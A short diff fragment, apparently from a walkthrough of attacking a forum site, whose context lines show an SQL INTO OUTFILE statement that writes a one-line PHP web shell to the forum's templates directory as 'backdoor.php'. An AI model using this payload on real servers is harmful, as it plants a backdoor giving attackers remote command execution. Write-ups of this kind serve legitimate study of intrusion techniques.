@@ -106,3 +106,4 @@ but if we remember about the forum, we can search about some vulnerabilities and
 so we can use:
 SELECT "<? system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/backdoor.php"
 
+
